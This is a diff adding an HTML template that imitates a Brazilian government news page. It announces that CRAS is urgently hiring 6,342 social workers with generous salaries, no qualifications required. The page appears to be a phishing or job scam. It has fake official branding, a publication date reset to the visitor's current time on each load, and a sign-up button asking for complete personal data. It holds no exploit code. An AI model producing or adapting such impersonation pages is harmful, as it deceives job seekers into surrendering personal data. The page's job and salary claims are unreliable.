@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  </script>
+
+
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Centro de Referência de Assistência Social | CRAS</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: italic;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    body {
+      font-family: 'Rawline', sans-serif;
+    }
+
+    /* Diminuir a espessura do negrito */
+    strong, .font-bold {
+      font-weight: 500 !important;
+    }
+    .encceja-title {
+      font-weight: 700;
+      font-size: 1rem;
+      color: #555;
+      line-height: normal;
+      text-transform: uppercase;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    .share-text {
+      font-size: 12px;
+      text-align: center;
+    }
+    .drop-cap::first-letter {
+      float: left;
+      font-size: 4em;
+      line-height: 0.68;
+      font-weight: bold;
+      margin-right: 0.05em;
+      color: #1451B4;
+    }
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 40%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    .light-disc {
+      list-style-type: none;
+    }
+    .light-disc li::before {
+      content: "\2022";
+      color: #BBBBBB;
+      font-weight: bold;
+      display: inline-block;
+      width: 1em;
+      margin-left: -1em;
+    }
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body class="bg-white">
+  <img src="https://i.ibb.co/yvTWdMd/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+     <div class="flex items-center justify-between py-2">
+      <div class="flex items-center">
+       <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1">
+       </i>
+       <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight relative -top-1">
+        Centro de Referência de Assistência Social | CRAS
+       </p>
+      </div>
+      <div class="flex items-center space-x-4">
+       <i class="fas fa-microphone text-sm text-[#1451B4] relative -top-1">
+       </i>
+       <i class="fas fa-search text-sm text-[#1451B4] relative -top-1">
+       </i>
+      </div>
+     </div>
+    </div>
+  </div>
+
+  <div class="container mx-auto px-4">
+   <div class="py-4">
+    <div class="flex items-center space-x-2 text-[13px]">
+     <a class="text-[#1451B4]" href="#">
+      <i class="fas fa-home text-sm text-[#1451B4]">
+      </i>
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Assuntos
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Notícias
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      CRAS
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <span class="font-bold">
+      Vagas 2025
+     </span>
+    </div>
+   </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <p class="encceja-title">CRAS - CENTRO DE REFERÊNCIA DE ASSISTÊNCIA SOCIAL</p>
+      <h2 class="main-title">
+        CRAS está contratando de forma urgente 6.342 novos Assistentes Sociais!
+      </h2>
+      <p class="text-gray-700 text-base">
+        Não perca esta oportunidade única! Salários de R$ 4.500 a R$ 5.500 + benefícios completos. Não é necessária formação prévia - você precisa apenas passar nos exames online de Serviço Social.
+      </p>
+    </div>
+    <div class="border-t py-4 my-4 -mx-4">
+      <div class="flex items-center justify-center">
+        <p class="text-gray-700 text-base mr-2">Compartilhe:</p>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-facebook-f"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-linkedin-in"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-whatsapp"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fas fa-link"></i></a>
+      </div>
+    </div>
+    <div class="text-center mb-4">
+      <p class="text-gray-700 text-base" id="publicationDate"></p>
+      <script>
+        const now = new Date();
+        const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' };
+        document.getElementById('publicationDate').textContent = `Publicado em ${now.toLocaleString('pt-BR', options)}`;
+      </script>
+      <p class="text-gray-700 text-base">Colaboradores: Secretaria Nacional de Assistência Social</p>
+    </div>
+    <div class="my-6">
+      <img alt="Logo do CRAS em fundo azul escuro com letras brancas" class="w-full" height="200" src="https://i.ibb.co/Xxkdqt2c/Localiza-Fone-2.png" width="600"/>
+    </div>
+    <div class="my-6">
+      <p class="drop-cap text-gray-700 text-base">O Centro de Referência de Assistência Social (CRAS) anuncia uma <b>contratação urgente</b> de 6.342 novos Assistentes Sociais para atuar em todo o território nacional. Esta é uma oportunidade única para ingressar no serviço público com excelente remuneração e benefícios completos. <b>Não é necessária formação prévia</b> - você precisa apenas ser aprovado nos exames online de Serviço Social que serão realizados nos próximos dias.</p>
+      <img src="https://i.ibb.co/Wv4LC6Wj/Localiza-Fone-3-2.png" alt="Banner do CRAS 2025" class="w-full mt-4">
+      <div class="container mx-auto pl-2 mt-6 w-full">
+        <div class="bg-gray-100 py-3 px-5 mb-5 w-full border-l-8 border-gray-400">
+          <p class="text-[16px] font-bold text-[#555555]">Salários e Benefícios - Total de 6.342 vagas</p>
+        </div>
+          <div class="mb-6 p-4">
+            <h3 class="font-bold text-lg mb-2">Remuneração e Benefícios:</h3>
+            <ul class="list-disc ml-6 space-y-2 text-gray-700 text-base">
+              <li><strong>Salário Base:</strong> R$ 4.500,00 a R$ 5.500,00</li>
+              <li><strong>Vale Alimentação:</strong> R$ 600,00/mês</li>
+              <li><strong>Vale Transporte:</strong> R$ 300,00/mês</li>
+              <li><strong>Plano de Saúde:</strong> 100% custeado pelo CRAS</li>
+              <li><strong>Plano Odontológico:</strong> Incluso para funcionário e dependentes</li>
+              <li><strong>Auxílio Creche:</strong> R$ 400,00/mês (até 6 anos)</li>
+              <li><strong>13º Salário:</strong> Garantido</li>
+              <li><strong>Férias Remuneradas:</strong> 30 dias + 1/3 constitucional</li>
+              <li><strong>FGTS:</strong> 8% sobre o salário</li>
+            </ul>
+          </div>
+          <p class="mb-3 leading-relaxed text-gray-700 text-base"><strong>Distribuição das 6.342 vagas por estado:</strong></p>
+          <table class="table-auto border-collapse border border-gray-300 mx-auto text-left text-gray-700 text-base">
+              <thead>
+                  <tr>
+                      <th class="border border-gray-300 px-4 py-2">Estado</th>
+                      <th class="border border-gray-300 px-4 py-2">Quantidade de Vagas</th>
+                  </tr>
+              </thead>
+              <tbody>
+                  <tr><td class="border border-gray-300 px-4 py-2">Acre</td><td class="border border-gray-300 px-4 py-2">45</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Alagoas</td><td class="border border-gray-300 px-4 py-2">124</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Amapá</td><td class="border border-gray-300 px-4 py-2">38</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Amazonas</td><td class="border border-gray-300 px-4 py-2">186</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Bahia</td><td class="border border-gray-300 px-4 py-2">682</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Ceará</td><td class="border border-gray-300 px-4 py-2">425</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Distrito Federal</td><td class="border border-gray-300 px-4 py-2">156</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Espírito Santo</td><td class="border border-gray-300 px-4 py-2">178</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Goiás</td><td class="border border-gray-300 px-4 py-2">298</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Maranhão</td><td class="border border-gray-300 px-4 py-2">315</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Mato Grosso</td><td class="border border-gray-300 px-4 py-2">142</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Mato Grosso do Sul</td><td class="border border-gray-300 px-4 py-2">118</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Minas Gerais</td><td class="border border-gray-300 px-4 py-2">896</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Pará</td><td class="border border-gray-300 px-4 py-2">387</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Paraíba</td><td class="border border-gray-300 px-4 py-2">168</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Paraná</td><td class="border border-gray-300 px-4 py-2">524</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Pernambuco</td><td class="border border-gray-300 px-4 py-2">445</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Piauí</td><td class="border border-gray-300 px-4 py-2">152</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Rio de Janeiro</td><td class="border border-gray-300 px-4 py-2">738</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Rio Grande do Norte</td><td class="border border-gray-300 px-4 py-2">158</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Rio Grande do Sul</td><td class="border border-gray-300 px-4 py-2">512</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Rondônia</td><td class="border border-gray-300 px-4 py-2">78</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Roraima</td><td class="border border-gray-300 px-4 py-2">42</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Santa Catarina</td><td class="border border-gray-300 px-4 py-2">287</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">São Paulo</td><td class="border border-gray-300 px-4 py-2">1248</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Sergipe</td><td class="border border-gray-300 px-4 py-2">98</td></tr>
+                  <tr><td class="border border-gray-300 px-4 py-2">Tocantins</td><td class="border border-gray-300 px-4 py-2">78</td></tr>
+              </tbody>
+          </table>
+        <br>
+        <div class="mb-6 p-4">
+          <h3 class="font-bold text-lg mb-2">Como se candidatar às vagas do CRAS:</h3>
+          <ul class="list-decimal ml-6 space-y-2 text-gray-700 text-base">
+            <li><strong>Passo 1:</strong> Clique no botão "Realizar Inscrição" abaixo</li>
+            <li><strong>Passo 2:</strong> Preencha seus dados pessoais completos</li>
+            <li><strong>Passo 3:</strong> Realize o exame online de Serviço Social</li>
+            <li><strong>Passo 4:</strong> Aguarde a confirmação da aprovação</li>
+          </ul>
+          <p class="mt-3 text-gray-700 text-base"><strong>Importante:</strong> O processo é totalmente gratuito e online. Não é necessária formação prévia em Serviço Social - o conhecimento pode ser adquirido através do exame preparatório incluído no processo.</p>
+        </div>
+        <div class="text-center">
+          <a href="/local" class="inline-block bg-[#1351b4] text-white px-8 py-3 rounded-[30px] font-bold hover:bg-[#0c3d8a] transition-colors duration-200 text-lg">
+            REALIZAR INSCRIÇÃO AGORA
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="my-6">
+      <p class="text-gray-700 text-base"><strong>Contratação Imediata após Aprovação –</strong></p>
+      <p class="text-gray-700 text-base">Após a aprovação no exame online, a contratação é imediata e você inicia suas atividades no CRAS em até 15 dias. Esta é uma oportunidade única de ingressar no serviço público com estabilidade, excelente remuneração e benefícios completos. As vagas são limitadas e o processo seletivo é por ordem de aprovação!</p>
+    </div>
+  </main>
+  <div class="w-full">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras flutuante no canto direito do site" class="w-10 h-10">
+  </a>
+  <script>
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
